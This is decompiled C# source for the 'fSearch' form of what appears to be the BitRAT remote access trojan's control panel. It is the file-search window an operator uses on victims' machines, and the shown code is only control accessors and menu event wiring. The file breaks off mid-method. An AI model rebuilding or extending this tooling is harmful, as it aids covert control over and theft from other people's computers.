﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x020001C7 RID: 455
[DesignerGenerated]
public sealed partial class fSearch : Form
{
	// Token: 0x060018C7 RID: 6343 RVA: 0x0000C761 File Offset: 0x0000A961
	public fSearch()
	{
		base.Load += this.fSearch_Load;
		base.Closing += this.fSearch_Closing;
		this.concurrentStack_0 = new ConcurrentStack<cFileSearch>();
		this.InitializeComponent();
	}

	// Token: 0x060018CA RID: 6346 RVA: 0x0000C79E File Offset: 0x0000A99E
	internal System.Windows.Forms.Timer vmethod_0()
	{
		return this.timer_0;
	}

	// Token: 0x060018CB RID: 6347 RVA: 0x000B520C File Offset: 0x000B340C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_11);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x060018CC RID: 6348 RVA: 0x0000C7A6 File Offset: 0x0000A9A6
	internal StatusStrip vmethod_2()
	{
		return this.statusStrip_0;
	}

	// Token: 0x060018CD RID: 6349 RVA: 0x0000C7AE File Offset: 0x0000A9AE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x060018CE RID: 6350 RVA: 0x0000C7B7 File Offset: 0x0000A9B7
	internal Panel vmethod_4()
	{
		return this.panel_0;
	}

	// Token: 0x060018CF RID: 6351 RVA: 0x0000C7BF File Offset: 0x0000A9BF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(Panel panel_1)
	{
		this.panel_0 = panel_1;
	}

	// Token: 0x060018D0 RID: 6352 RVA: 0x0000C7C8 File Offset: 0x0000A9C8
	internal FastObjectListView vmethod_6()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x060018D1 RID: 6353 RVA: 0x000B5250 File Offset: 0x000B3450
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(FastObjectListView fastObjectListView_1)
	{
		EventHandler value = new EventHandler(this.method_29);
		EventHandler<FormatRowEventArgs> eventHandler = new EventHandler<FormatRowEventArgs>(this.method_32);
		EventHandler eventHandler2 = new EventHandler(this.method_35);
		MouseEventHandler value2 = new MouseEventHandler(this.method_36);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.SelectedIndexChanged -= value;
			fastObjectListView.FormatRow -= eventHandler;
			fastObjectListView.SelectionChanged -= eventHandler2;
			fastObjectListView.MouseUp -= value2;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.SelectedIndexChanged += value;
			fastObjectListView.FormatRow += eventHandler;
			fastObjectListView.SelectionChanged += eventHandler2;
			fastObjectListView.MouseUp += value2;
		}
	}

	// Token: 0x060018D2 RID: 6354 RVA: 0x0000C7D0 File Offset: 0x0000A9D0
	internal OLVColumn vmethod_8()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x060018D3 RID: 6355 RVA: 0x0000C7D8 File Offset: 0x0000A9D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_0 = olvcolumn_7;
	}

	// Token: 0x060018D4 RID: 6356 RVA: 0x0000C7E1 File Offset: 0x0000A9E1
	internal OLVColumn vmethod_10()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x060018D5 RID: 6357 RVA: 0x0000C7E9 File Offset: 0x0000A9E9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_1 = olvcolumn_7;
	}

	// Token: 0x060018D6 RID: 6358 RVA: 0x0000C7F2 File Offset: 0x0000A9F2
	internal OLVColumn vmethod_12()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x060018D7 RID: 6359 RVA: 0x0000C7FA File Offset: 0x0000A9FA
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_2 = olvcolumn_7;
	}

	// Token: 0x060018D8 RID: 6360 RVA: 0x0000C803 File Offset: 0x0000AA03
	internal ToolStripStatusLabel vmethod_14()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x060018D9 RID: 6361 RVA: 0x0000C80B File Offset: 0x0000AA0B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripStatusLabel toolStripStatusLabel_4)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_4;
	}

	// Token: 0x060018DA RID: 6362 RVA: 0x0000C814 File Offset: 0x0000AA14
	internal ToolStripStatusLabel vmethod_16()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x060018DB RID: 6363 RVA: 0x0000C81C File Offset: 0x0000AA1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripStatusLabel toolStripStatusLabel_4)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_4;
	}

	// Token: 0x060018DC RID: 6364 RVA: 0x0000C825 File Offset: 0x0000AA25
	internal OLVColumn vmethod_18()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x060018DD RID: 6365 RVA: 0x0000C82D File Offset: 0x0000AA2D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_3 = olvcolumn_7;
	}

	// Token: 0x060018DE RID: 6366 RVA: 0x0000C836 File Offset: 0x0000AA36
	internal OLVColumn vmethod_20()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x060018DF RID: 6367 RVA: 0x0000C83E File Offset: 0x0000AA3E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_4 = olvcolumn_7;
	}

	// Token: 0x060018E0 RID: 6368 RVA: 0x0000C847 File Offset: 0x0000AA47
	internal OLVColumn vmethod_22()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x060018E1 RID: 6369 RVA: 0x0000C84F File Offset: 0x0000AA4F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_5 = olvcolumn_7;
	}

	// Token: 0x060018E2 RID: 6370 RVA: 0x0000C858 File Offset: 0x0000AA58
	internal TextBox vmethod_24()
	{
		return this.textBox_0;
	}

	// Token: 0x060018E3 RID: 6371 RVA: 0x0000C860 File Offset: 0x0000AA60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(TextBox textBox_2)
	{
		this.textBox_0 = textBox_2;
	}

	// Token: 0x060018E4 RID: 6372 RVA: 0x0000C869 File Offset: 0x0000AA69
	internal Label vmethod_26()
	{
		return this.label_0;
	}

	// Token: 0x060018E5 RID: 6373 RVA: 0x0000C871 File Offset: 0x0000AA71
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(Label label_3)
	{
		this.label_0 = label_3;
	}

	// Token: 0x060018E6 RID: 6374 RVA: 0x0000C87A File Offset: 0x0000AA7A
	internal Label vmethod_28()
	{
		return this.label_1;
	}

	// Token: 0x060018E7 RID: 6375 RVA: 0x0000C882 File Offset: 0x0000AA82
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(Label label_3)
	{
		this.label_1 = label_3;
	}

	// Token: 0x060018E8 RID: 6376 RVA: 0x0000C88B File Offset: 0x0000AA8B
	internal TextBox vmethod_30()
	{
		return this.textBox_1;
	}

	// Token: 0x060018E9 RID: 6377 RVA: 0x000B52E8 File Offset: 0x000B34E8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(TextBox textBox_2)
	{
		EventHandler value = new EventHandler(this.method_31);
		TextBox textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_1 = textBox_2;
		textBox = this.textBox_1;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x060018EA RID: 6378 RVA: 0x0000C893 File Offset: 0x0000AA93
	internal OLVColumn vmethod_32()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x060018EB RID: 6379 RVA: 0x0000C89B File Offset: 0x0000AA9B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(OLVColumn olvcolumn_7)
	{
		this.olvcolumn_6 = olvcolumn_7;
	}

	// Token: 0x060018EC RID: 6380 RVA: 0x0000C8A4 File Offset: 0x0000AAA4
	internal Label vmethod_34()
	{
		return this.label_2;
	}

	// Token: 0x060018ED RID: 6381 RVA: 0x0000C8AC File Offset: 0x0000AAAC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(Label label_3)
	{
		this.label_2 = label_3;
	}

	// Token: 0x060018EE RID: 6382 RVA: 0x0000C8B5 File Offset: 0x0000AAB5
	internal ContextMenuStrip vmethod_36()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x060018EF RID: 6383 RVA: 0x0000C8BD File Offset: 0x0000AABD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x060018F0 RID: 6384 RVA: 0x0000C8C6 File Offset: 0x0000AAC6
	internal ToolStripMenuItem vmethod_38()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x060018F1 RID: 6385 RVA: 0x0000C8CE File Offset: 0x0000AACE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(ToolStripMenuItem toolStripMenuItem_26)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_26;
	}

	// Token: 0x060018F2 RID: 6386 RVA: 0x0000C8D7 File Offset: 0x0000AAD7
	internal ToolStripMenuItem vmethod_40()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x060018F3 RID: 6387 RVA: 0x0000C8DF File Offset: 0x0000AADF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(ToolStripMenuItem toolStripMenuItem_26)
	{
		this.toolStripMenuItem_1 = toolStripMenuItem_26;
	}

	// Token: 0x060018F4 RID: 6388 RVA: 0x0000C8E8 File Offset: 0x0000AAE8
	internal ToolStripMenuItem vmethod_42()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x060018F5 RID: 6389 RVA: 0x000B532C File Offset: 0x000B352C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_12);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060018F6 RID: 6390 RVA: 0x0000C8F0 File Offset: 0x0000AAF0
	internal ToolStripMenuItem vmethod_44()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x060018F7 RID: 6391 RVA: 0x000B5370 File Offset: 0x000B3570
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_25);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060018F8 RID: 6392 RVA: 0x0000C8F8 File Offset: 0x0000AAF8
	internal ToolStripSeparator vmethod_46()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x060018F9 RID: 6393 RVA: 0x0000C900 File Offset: 0x0000AB00
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_0 = toolStripSeparator_7;
	}

	// Token: 0x060018FA RID: 6394 RVA: 0x0000C909 File Offset: 0x0000AB09
	internal ToolStripMenuItem vmethod_48()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x060018FB RID: 6395 RVA: 0x000B53B4 File Offset: 0x000B35B4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_13);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060018FC RID: 6396 RVA: 0x0000C911 File Offset: 0x0000AB11
	internal ToolStripSeparator vmethod_50()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x060018FD RID: 6397 RVA: 0x0000C919 File Offset: 0x0000AB19
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_1 = toolStripSeparator_7;
	}

	// Token: 0x060018FE RID: 6398 RVA: 0x0000C922 File Offset: 0x0000AB22
	internal ToolStripMenuItem vmethod_52()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x060018FF RID: 6399 RVA: 0x0000C92A File Offset: 0x0000AB2A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(ToolStripMenuItem toolStripMenuItem_26)
	{
		this.toolStripMenuItem_5 = toolStripMenuItem_26;
	}

	// Token: 0x06001900 RID: 6400 RVA: 0x0000C933 File Offset: 0x0000AB33
	internal ToolStripMenuItem vmethod_54()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06001901 RID: 6401 RVA: 0x000B53F8 File Offset: 0x000B35F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_14);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_6 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001902 RID: 6402 RVA: 0x0000C93B File Offset: 0x0000AB3B
	internal ToolStripMenuItem vmethod_56()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x06001903 RID: 6403 RVA: 0x0000C943 File Offset: 0x0000AB43
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(ToolStripMenuItem toolStripMenuItem_26)
	{
		this.toolStripMenuItem_7 = toolStripMenuItem_26;
	}

	// Token: 0x06001904 RID: 6404 RVA: 0x0000C94C File Offset: 0x0000AB4C
	internal ToolStripMenuItem vmethod_58()
	{
		return this.toolStripMenuItem_8;
	}

	// Token: 0x06001905 RID: 6405 RVA: 0x000B543C File Offset: 0x000B363C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_15);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_8 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_8;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001906 RID: 6406 RVA: 0x0000C954 File Offset: 0x0000AB54
	internal ToolStripMenuItem vmethod_60()
	{
		return this.toolStripMenuItem_9;
	}

	// Token: 0x06001907 RID: 6407 RVA: 0x000B5480 File Offset: 0x000B3680
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_15);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_9;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_9 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_9;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001908 RID: 6408 RVA: 0x0000C95C File Offset: 0x0000AB5C
	internal ToolStripMenuItem vmethod_62()
	{
		return this.toolStripMenuItem_10;
	}

	// Token: 0x06001909 RID: 6409 RVA: 0x000B54C4 File Offset: 0x000B36C4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_16);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_10;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_10 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_10;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600190A RID: 6410 RVA: 0x0000C964 File Offset: 0x0000AB64
	internal ToolStripMenuItem vmethod_64()
	{
		return this.toolStripMenuItem_11;
	}

	// Token: 0x0600190B RID: 6411 RVA: 0x000B5508 File Offset: 0x000B3708
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_16);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_11 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_11;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600190C RID: 6412 RVA: 0x0000C96C File Offset: 0x0000AB6C
	internal ToolStripMenuItem vmethod_66()
	{
		return this.toolStripMenuItem_12;
	}

	// Token: 0x0600190D RID: 6413 RVA: 0x000B554C File Offset: 0x000B374C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_17);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_12;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_12 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_12;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600190E RID: 6414 RVA: 0x0000C974 File Offset: 0x0000AB74
	internal ToolStripMenuItem vmethod_68()
	{
		return this.toolStripMenuItem_13;
	}

	// Token: 0x0600190F RID: 6415 RVA: 0x000B5590 File Offset: 0x000B3790
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_17);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_13;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_13 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_13;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001910 RID: 6416 RVA: 0x0000C97C File Offset: 0x0000AB7C
	internal ToolStripMenuItem vmethod_70()
	{
		return this.toolStripMenuItem_14;
	}

	// Token: 0x06001911 RID: 6417 RVA: 0x000B55D4 File Offset: 0x000B37D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_71(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_14 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_14;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001912 RID: 6418 RVA: 0x0000C984 File Offset: 0x0000AB84
	internal ToolStripMenuItem vmethod_72()
	{
		return this.toolStripMenuItem_15;
	}

	// Token: 0x06001913 RID: 6419 RVA: 0x000B5618 File Offset: 0x000B3818
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_73(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_15 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_15;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001914 RID: 6420 RVA: 0x0000C98C File Offset: 0x0000AB8C
	internal ToolStripMenuItem vmethod_74()
	{
		return this.toolStripMenuItem_16;
	}

	// Token: 0x06001915 RID: 6421 RVA: 0x000B565C File Offset: 0x000B385C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_75(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_16;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_16 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_16;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001916 RID: 6422 RVA: 0x0000C994 File Offset: 0x0000AB94
	internal ToolStripSeparator vmethod_76()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06001917 RID: 6423 RVA: 0x0000C99C File Offset: 0x0000AB9C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_77(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_2 = toolStripSeparator_7;
	}

	// Token: 0x06001918 RID: 6424 RVA: 0x0000C9A5 File Offset: 0x0000ABA5
	internal ToolStripMenuItem vmethod_78()
	{
		return this.toolStripMenuItem_17;
	}

	// Token: 0x06001919 RID: 6425 RVA: 0x000B56A0 File Offset: 0x000B38A0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_79(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_19);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_17 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_17;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600191A RID: 6426 RVA: 0x0000C9AD File Offset: 0x0000ABAD
	internal ToolStripSeparator vmethod_80()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x0600191B RID: 6427 RVA: 0x0000C9B5 File Offset: 0x0000ABB5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_81(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_3 = toolStripSeparator_7;
	}

	// Token: 0x0600191C RID: 6428 RVA: 0x0000C9BE File Offset: 0x0000ABBE
	internal ToolStripMenuItem vmethod_82()
	{
		return this.toolStripMenuItem_18;
	}

	// Token: 0x0600191D RID: 6429 RVA: 0x0000C9C6 File Offset: 0x0000ABC6
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_83(ToolStripMenuItem toolStripMenuItem_26)
	{
		this.toolStripMenuItem_18 = toolStripMenuItem_26;
	}

	// Token: 0x0600191E RID: 6430 RVA: 0x0000C9CF File Offset: 0x0000ABCF
	internal ToolStripMenuItem vmethod_84()
	{
		return this.toolStripMenuItem_19;
	}

	// Token: 0x0600191F RID: 6431 RVA: 0x000B56E4 File Offset: 0x000B38E4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_85(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_20);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_19;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_19 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_19;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001920 RID: 6432 RVA: 0x0000C9D7 File Offset: 0x0000ABD7
	internal ToolStripSeparator vmethod_86()
	{
		return this.toolStripSeparator_4;
	}

	// Token: 0x06001921 RID: 6433 RVA: 0x0000C9DF File Offset: 0x0000ABDF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_87(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_4 = toolStripSeparator_7;
	}

	// Token: 0x06001922 RID: 6434 RVA: 0x0000C9E8 File Offset: 0x0000ABE8
	internal ToolStripMenuItem vmethod_88()
	{
		return this.toolStripMenuItem_20;
	}

	// Token: 0x06001923 RID: 6435 RVA: 0x0000C9F0 File Offset: 0x0000ABF0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_89(ToolStripMenuItem toolStripMenuItem_26)
	{
		this.toolStripMenuItem_20 = toolStripMenuItem_26;
	}

	// Token: 0x06001924 RID: 6436 RVA: 0x0000C9F9 File Offset: 0x0000ABF9
	internal ToolStripMenuItem vmethod_90()
	{
		return this.toolStripMenuItem_21;
	}

	// Token: 0x06001925 RID: 6437 RVA: 0x000B5728 File Offset: 0x000B3928
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_91(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_22);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_21;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_21 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_21;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001926 RID: 6438 RVA: 0x0000CA01 File Offset: 0x0000AC01
	internal ToolStripSeparator vmethod_92()
	{
		return this.toolStripSeparator_5;
	}

	// Token: 0x06001927 RID: 6439 RVA: 0x0000CA09 File Offset: 0x0000AC09
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(ToolStripSeparator toolStripSeparator_7)
	{
		this.toolStripSeparator_5 = toolStripSeparator_7;
	}

	// Token: 0x06001928 RID: 6440 RVA: 0x0000CA12 File Offset: 0x0000AC12
	internal ToolStripMenuItem vmethod_94()
	{
		return this.toolStripMenuItem_22;
	}

	// Token: 0x06001929 RID: 6441 RVA: 0x000B576C File Offset: 0x000B396C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_23);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_22 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600192A RID: 6442 RVA: 0x0000CA1A File Offset: 0x0000AC1A
	internal ToolStripMenuItem vmethod_96()
	{
		return this.toolStripMenuItem_23;
	}

	// Token: 0x0600192B RID: 6443 RVA: 0x000B57B0 File Offset: 0x000B39B0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(ToolStripMenuItem toolStripMenuItem_26)
	{
		EventHandler value = new EventHandler(this.method_21);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_23 = toolStripMenuItem_26;
		toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600192C RID: 6444 RVA: 0x0000CA22 File Offset: 0x0000AC22
	internal ToolStripSeparator vmethod_98()
	{
		return this.toolStripSeparator_6;
	}

	// Token: 0x0600192D RID: 6445 RVA: 0x0000CA2A File Offset: 0x0000AC2A
	[MethodImpl(MethodImplOptions.Synchronized)]
